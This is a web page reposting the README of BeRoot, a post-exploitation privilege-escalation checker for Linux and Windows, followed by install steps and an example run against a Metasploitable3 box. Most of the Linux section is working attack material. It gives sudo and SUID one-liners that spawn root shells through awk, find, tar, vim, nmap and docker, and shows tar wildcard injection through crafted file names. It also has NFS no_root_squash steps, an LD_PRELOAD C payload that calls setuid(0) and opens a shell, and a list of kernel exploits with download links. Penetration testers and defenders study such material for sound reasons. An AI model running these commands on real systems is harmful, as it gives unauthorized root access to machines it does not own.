                <PlainText>false</PlainText>  
            </Password>  
            <Description>Local Administrator</Description>  
            <DisplayName>Administrator</DisplayName>  
            <Group>Administrators</Group>  
            <Name>Administrator</Name>  
        </LocalAccount>  
    </LocalAccounts>  
</UserAccounts>  
  
  

### Other possible misconfigurations

#### Other tests are realized to check if it's possible to:

- Modify an existing service
- Create a new service
- Modify a startup key (on HKLM)
- Modify directory where all scheduled tasks are stored: "C:\Windows\system32\Tasks"

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglSimWw5ZFEWdFwlq5t2Y0SWpknBED-BJ3EWj2T2O5x3yhjeu1axeiankrcHX1STKln2m-YmAbvD5ELtxKI5ZDa0iTNd8CoW0uHEsF6QT339mbivkJMtfxrum0tmltYb3xd3tVENsu87Fo/s640/BeRoot+Privilage+Escalation.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglSimWw5ZFEWdFwlq5t2Y0SWpknBED-BJ3EWj2T2O5x3yhjeu1axeiankrcHX1STKln2m-YmAbvD5ELtxKI5ZDa0iTNd8CoW0uHEsF6QT339mbivkJMtfxrum0tmltYb3xd3tVENsu87Fo/s1600/BeRoot+Privilage+Escalation.jpg)

  

  

## BeRoot For Linux

BeRoot is a post exploitation tool to check common misconfigurations on Linux and Mac OS to find a way to escalate our privilege.

  

To understand privilege escalation on these systems, you should understand at least two main notions: LOLBins (this name has been given for Windows binaries but it should be correct to use it for Linux as well) and Wildcards. 

This Readme explains all technics implemented by BeRoot to better understand how to exploit it.

  

### LOLBins

LOLBins could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root.

  

**Here is a list of well-known binaries:**

- **awk**

sudo awk 'BEGIN {system("/bin/sh")}'

- **docker (if you can call docker, no need to run it with sudo)**

docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p

- **find**

sudo find . -type d -exec sh -c id {} \;

- **file viewer**

less: !bash

man:  !bash or $ sudo man -P whoami man

more:  !bash

- **file modifications (cannot be consider as LOLbins but useful for privilege escalation)**

cp: sudo cp -f your_file /etc/sudoers

mv: sudo mv -f your_file /etc/sudoers

  

- **ftp / sftp**

ftp> ! ls

- **git**

export PAGER=./runme.sh

sudo git -p help

- **mount**

sudo mount -o bind /bin/bash /bin/mount

sudo mount

- **nmap**

echo "os.execute('/bin/sh')" > /tmp/script.nse

sudo nmap --script=/tmp/script.nse

- **rsync**

echo "whoami > /tmp/whoami" > /tmp/tmpfile

sudo rsync  -e 'sh /tmp/tmpfile' /dev/null 127.0.0.1:/dev/null 2>/dev/null

  

cat whoami 

root

- **scripting languages**

lua:  os.execute('/bin/sh')

perl:  sudo  perl -e 'exec "/bin/sh";'

python: sudo  python -c 'import os;os.system("/bin/sh")'

ruby:  sudo ruby -e 'exec "/bin/sh"'

- **tar**

sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh

text editor

vi:  sudo vi -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell

vim :  sudo vim -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell

- **tcpdump**

echo "whoami > /tmp/whoami" > /tmp/tmpfile

sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root

  

cat whoami 

root

- **wget (overwrite system file - need a web server)**

sudo wget http://127.0.0.1/sudoers -O /etc/sudoers

- **zip**

echo "/bin/sh" > /tmp/run.sh

sudo zip z.zip * -T -TT /tmp/run.sh

  

_Note: If you have more binary example, do not hesitate to open an issue explaining the technic and I will add it on the list._

  

Having sudo access on these binaries do not mean you could always manage to execute commands on the system. For example, using the mount binary with a limited user could give you the following well known error, if it's well configured:

  

mount: only root can use "--options" option

  

### Wildcards

If you have never heard about Unix wildcards, I suggest you read this very well explained [article](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt). Using wildcards could lead into code execution if this one is not well called.

  

For our example, we want to get a shell ("sh") using the tar command to execute code on the server. As explained on the LOLBin section, we could get it doing:

  

tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh

  

We consider a test file which is used to realize an archive of all files present on the directory.

  

user@host:~$ cat test.sh 

tar cf archive.tar * 

**Here are the steps to exploit this bad configuration:**

- open nano (with no arguments)
- write something in it

**save file using tar arguments as file names:**

- --checkpoint-action=exec=sh
- --checkpoint=1

**Once created, this is what you will find:**

  

user@host:~$ ls -la 

total 32

-rw-r--r-- 1 user user     5 Jan 12 10:34 --checkpoint-action=exec=sh

-rw-r--r-- 1 user user     3 Jan 12 10:33 --checkpoint=1

drwxr-xr-x 2 user user  4096 Jan 12 10:34 .

drwxr-xr-x 7 user user  4096 Jan 12 10:29 ..

-rwxr-xr-x 1 user user    22 Jan 12 10:32 test.sh

  

If this file is executed as root (from cron table, from sudoers, etc.), you should gain root access on the system.

  

user@host:~$ sudo ./test.sh 

sh-4.3# id

uid=0(root) gid=0(root) groups=0(root)

  

So depending on which binary and how the wildcard are used, the exploitation can be done or not. So on our example, the exploitation would not work anymore if the file would be like this:

  

user@host:~$ cat test.sh

tar cf archive.tar *.txt

  

Thus, using a tool to detect these misconfigurations is very difficult. A manually analyse should be done to check if it's a false positive or not.

  

### Sensitive files

Lots of file are run with high permissions on the system (e.g cron files, services, etc.). Here is an example of intersting directories and files:

- /etc/init.d
- /etc/cron.d 
- /etc/cron.daily
- /etc/cron.hourly
- /etc/cron.monthly
- /etc/cron.weekly
- /etc/sudoers
- /etc/exports
- /etc/at.allow
- /etc/at.deny
- /etc/crontab
- /etc/cron.allow
- /etc/cron.deny
- /etc/anacrontab
- /var/spool/cron/crontabs/root

### Here are the tests done by BeRoot:

- checks if you have access with write permission on these files.
- checks inside the file, to find other paths with write permissions.
- checks for wildcards (this check could raise false positives, but could also get you useful information). Sometimes, you may need write permissions on a specific folder to create your malicious file (as explained on the wildcard section), this check is not done because it could be done by two many ways on the script and it's difficult to automate.

### Suid binaries

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. So if suid file is owned by root, you should execute it using root privilege.

  

BeRoot prints all suid files because a manually analyse should be done on each binary. However, it realizes some actions:

- checks if we have write permissions on these binary (why not ? :))
- checks if a LOLBin is used as suid to be able to execute system commands using it (remember you could have suid LOLBin without beeing able to exectute commands - checks LOLBin section with the false positive example using mount).

To analyse manually, checking for .so files loaded from a writable path should be a great idea (this check has not been implemented on BeRoot):

  

strace [SUID_PATH] 2>&1 | grep -i -E "open|access|no such file"

### NFS Root Squashing

If no_root_squash appears in /etc/exports, privilege escalation may be done. More information can be found here.

#### Exploitation:

- mkdir /tmp/nfsdir  # create dir
- mount -t nfs 192.168.1.10:/shared /tmp/nfsdir # mount directory 
- cd /tmp/nfsdir
- cp /bin/bash .  # copy wanted shell 
- chmod +s bash  # set suid permission

### LD_PRELOAD

If LD_PRELOAD is explicitly defined on sudoers file, it could be used to elevate our privilege. \

#### For example:

Defaults        env_keep += LD_PRELOAD

  

**Create a share object:**

  

#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");

setgid(0);

setuid(0);

system("/bin/sh");

}

  

**Compile it:**

  

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

  

If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object:

  

sudo LD_PRELOAD=/tmp/shell.so find

  

### Sudoers file

Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in /etc/sudoers file. 

To better understand the BeRoot workflow, you should have an idea on how a sudoers line is composed.

  

**Basic line pattern:**

  

users  hosts = (run-as) tags: commands

#### **Here is an example using aliases.**

User_Alias ADMINS = admin, user, root

Cmnd_Alias ADMIN_CMDS = /sbin/service, /usr/sbin/iptables, python /tmp/file.py

ADMINS ALL = (ALL) NOPASSWD: ADMIN_CMDS

  

**So users "admin", "user" and "root" could execute "service", "iptables" and "file.py" without password needed (thanks to NOPASSWD):**

  

admin,user,root ALL = (ALL) NOPASSWD: /sbin/service, /usr/sbin/iptables, python /tmp/file.py

  

**So BeRoot will analyse all rules:**

  

**if it affects our user or our user's group:**

- check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
- check for LOLBins
- check for LOLBins + wildcards
- check if we can impersonate another user ("su" command)
- check write permissions on sensitive files and suid bin for this user
- realize again all these checks on the sudoers file using this new user

**Credit:** This information was adapted from an excellent guide on [HackersOnlineClub](https://blog.hackersonlineclub.com/2018/07/beroot-post-exploitation-tool-to-check.html). Be sure to check out the original post for more details.

# BeRoot

BeRoot is a powerful post-exploitation tool designed to identify common misconfigurations that can be leveraged for privilege escalation.

![](https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg)


```
# Clone repo:
git clone https://github.com/AlessandroZ/BeRoot.git
# CD into Linux / Windows directory and run beroot.py:
python beroot.py --password <PASSWORD>
```

> Note: Specify user password as an argument, to potentially get more results.

Example Output from a Metasploitable3 Ubuntu 14.04 box:

```

|====================================================================|
|                                                                    |
|                      Linux Privilege Escalation                    |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

Getting permissions of sensitive files.
Getting suid bins.

################ Suid Binaries  ################

/bin/umount 
/bin/mount 
[+] gtfobins found:
	- sudo mount -o bind /bin/sh /bin/mount
	- sudo mount
/bin/su 
[+] gtfobins found:
	- sudo su
/bin/fusermount 
/usr/bin/lppasswd 
/usr/bin/mtr 
[+] gtfobins found:
	- LFILE=file_to_read
	- sudo mtr --raw -F "$LFILE"
/usr/bin/pkexec 
[+] gtfobins found:
	- sudo pkexec /bin/sh
/usr/bin/chfn 
/usr/bin/passwd 
/usr/bin/sudo 
/usr/bin/newgrp 
/usr/bin/gpasswd 
/usr/bin/chsh 
/usr/bin/traceroute6.iputils 
/usr/sbin/uuidd 
/usr/sbin/pppd 
/usr/lib/eject/dmcrypt-get-device 
/usr/lib/openssh/ssh-keysign 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
[+] exec calls found:
	- /tmp [writable]
/usr/lib/policykit-1/polkit-agent-helper-1 
/usr/lib/pt_chown 
/sbin/mount.nfs 


################ Sudo rules ################

### Rules for vagrant ###

ALL: all permissions
rule: all
ALL: all permissions
rule: all


################ Docker ################

/etc/init.d/docker found
->docker run -v /home/${USER}:/h_docs                     ubuntu bash -c 'cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;' && ~/rootshell -p

################ Mounted docker socket ################

Writable: False
Sock: /run/docker.sock

Writable: False
Sock: /var/run/docker.sock



################ Exploits ################


Available information:

Kernel version: 3.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

76 kernel space exploits
48 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-6663,CVE-2016-6664|CVE-2016-6662] mysql-exploit-chain

   Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
   Exposure: less probable
   Tags: ubuntu=16.04.1
   Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
   Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2014-0038] timeoutpwn

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=13.10
   Download URL: https://www.exploit-db.com/download/31346
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2014-0038] timeoutpwn 2

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
   Download URL: https://www.exploit-db.com/download/31347
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working

Elapsed time = 11.8894479275
```

**Credit:** This information was adapted from an excellent guide on [Cyberkb](https://cyberkb.org/beroot/). Be sure to check out the original post for more details.


<iframe width="560" height="315" src="https://www.youtube.com/embed/ixpkr2GmBCY?si=Mt-ToiCbIlcyemsV" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=ixpkr2GmBCY). Be sure to check out the original post for more details.






